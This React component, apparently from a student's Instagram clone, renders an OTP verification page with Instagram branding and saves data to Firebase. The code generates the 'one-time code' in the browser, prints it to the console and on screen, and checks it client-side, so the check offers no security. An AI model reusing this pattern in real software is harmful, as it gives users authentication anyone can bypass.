import React, { useState, useEffect } from "react";

import { useNavigate } from "react-router-dom";
import micro from "./imgs/micro.png";
import auth from "./imgs/auth.png";
import play from "./imgs/play.png";
import ss1 from "./imgs/screenshot1.png";
import allimg from "./imgs/allimg.png";
import ss2 from "./imgs/screenshot2.png";
import ss3 from "./imgs/screenshot3.png";
import ss4 from "./imgs/screenshot4.png";
import { useFirebase } from "./Firebase";

export default function OtpPage() {
  const navigate = useNavigate();
  const firebase=useFirebase();
console.log(firebase.email,"fffff")
  // OTP ko state me store karenge
  const [generatedOtp, setGeneratedOtp] = useState('');
  const [userOtp, setUserOtp] = useState('');
  const [errorMessage, setErrorMessage] = useState('');

  // OTP generate karne ka function
  const generateOtp = () => {
    const otp = Math.floor(100000 + Math.random() * 900000).toString(); // 6 digit ka OTP generate karega aur string me convert karega
    setGeneratedOtp(otp);
    console.log("Generated OTP:", otp); // Testing ke liye OTP ko console me dikhayenge
  };

  // Page load hone par OTP generate karna
  useEffect(() => {
    generateOtp(); // Page load hone par OTP generate karega
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    firebase.saveData();

    // User OTP ko compare karna generated OTP se
    if (userOtp === generatedOtp) {
      
      alert("OTP Sahi hai! Home page par navigate ho rahe hain.");
      navigate("/SeeAll");
    } else {
      setErrorMessage("Invalid OTP");
    }
  };
  // Image slider ke liye state
  const [Moveimg, setMoveimg] = useState(ss1);
  const [Indx, setIndx] = useState(0);
  const Imges = [ss1, ss2, ss3, ss4];

  // Image slider effect
  useEffect(() => {
    const interval = setInterval(() => {
      setMoveimg(Imges[Indx]);
      if (Indx === 3) {
        setIndx(0);
      } else {
        setIndx(Indx + 1);
      }
    }, 3000);

    return () => clearInterval(interval);
  }, [Indx, Imges]);

  return (
    <>
      <div
        className="Main_container bg- w-100 h-100 d-flex align-items-center justify-content-center"
        style={{ height: "663.98px" }}
      >
        <div
          className="Second_main bg- d-flex "
          style={{
            margin: "32px 81.5px 0px",
            width: "936px",
            height: "803.984px",
          }}
        >
          <div className="col first w-100 bg-" style={{ position: "relative" }}>
            <img src={auth} className="mt-3" alt="Auth" />
            <div className="text-center w-100" style={{ position: "absolute", top: "0px", right: "-50px", marginTop: "-7px" }}>
              <img src={Moveimg} alt="Move_img" className="mt-5" />
            </div>
          </div>

          <div className="col Second w-100 bg-" style={{ padding: "13px 33px" }}>
            {/* Login */}
            <div
              className="Login_data bg- p-4 d-flex align-items-center justify-content-center flex-column gap-2"
              style={{
                width: "350px",
                border: "1px solid #bdbdbd",
              }}
            >
              <span style={{ backgroundRepeat: "no-repeat", backgroundPosition: "30px -148px", height: "76px", width: "64px", overflow: "hidden" }}>
                <img src={allimg} alt="Insta_logo" />
              </span>
              <span className="w-100 text-center px-5" style={{ color: "#000", fontSize: "16px", fontWeight: "600" }}>
                Just one more step
              </span>
              <span className="d-flex flex-column text-center">
                <span className="d-flex">
                  <span style={{ color: "black", fontSize: "14px" }}>Enter the 6-digit code we sent to:{firebase.email}</span>
                  <span style={{ fontSize: "14px", color: "#0095f6" }}>This is your mobile no.</span>
                </span>
                <span style={{ fontSize: "13px", color: "red" }}>{generatedOtp}</span>
              </span>

              {/* OTP input form */}
              <form onSubmit={handleSubmit} className="d-flex align-items-center flex-column justify-content-center">
                <div className="input-container">
                  <input
                    type="text"
                    name="otp"
                    autoComplete="on"
                    placeholder=" "
                    required
                    id="inputs"
                    value={userOtp}
                    onChange={(e) => setUserOtp(e.target.value)} // OTP input ko update karna
                  />
                  <label className="floating-placeholder" htmlFor="name">
                    ######
                  </label>
                </div>
                <button
                  type="submit"
                  style={{ color: "#0095f6", border: "none", background: "none", fontSize: "14px", fontWeight: "600" }}
                >
                  Verify OTP
                </button>
              </form>

              {/* Error message agar OTP galat hai */}
              {errorMessage && <span style={{ color: "red" }}>{errorMessage}</span>}

              <div className="d-flex gap-2">
                <button
                  style={{ color: "#0095f6", border: "none", background: "none", fontSize: "14px", fontWeight: "600" }}
                >
                  <span>Change number</span>
                </button>
                |
                <button
                  onClick={generateOtp}  // Yahan OTP dubara generate hoga
                  style={{ color: "#0095f6", border: "none", background: "none", fontSize: "14px", fontWeight: "600" }}
                >
                  <span>Request new code</span>
                </button>
              </div>
            </div>


            <div
              style={{
                width: "350px",
                height: "63px",
                border: "1px solid #bdbdbd",
                fontSize: "14px",
              }}
              className="mt-2 d-flex align-items-center justify-content-center"
            >
              <span>Don't have a account? </span>
              <button
                className="fw-bold ms-1"
                style={{ border: "none", color: "#0095f6", background: "none" }}
                onClick={() => navigate("/")}
              >
                Log in
              </button>
            </div>

            <div className="d-flex mt-3 align-items-center justify-content-center" style={{ width: "350px" }}>
              <span style={{ color: "#000000", fontSize: "14px" }}>Get the app.</span>
            </div>

            <div className="Play_store_logo d-flex justify-content-center gap-2 mt-3" style={{ width: "350px", height: "44px" }}>
              <img src={play} alt="playstore_img" />
              <img src={micro} alt="microsoft_img" />
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="w-100 mt-5 d-flex flex-column align-items-center justify-content-center flex-column">
        <div
          className="fotter_data d-flex align-items-center gap-4 justify-content-center"
          style={{ maxWidth: "1066px", flexWrap: "wrap" }}
        >
          <a style={{ color: "#737373", fontSize: "12px" }}>Meta</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>About</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>Blog</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>Jobs</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>Help</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>API</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>Privacy</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>Terms</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>Top Accounts</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>Hashtags</a>
          <a style={{ color: "#737373", fontSize: "12px" }}>Locations</a>
        </div>

        <div className="d-flex align-items-center justify-content-center mt-3">
          <span style={{ color: "#737373", fontSize: "12px" }}>© 2024 Instagram from Meta</span>
        </div>
      </div>
    </>
  );
}
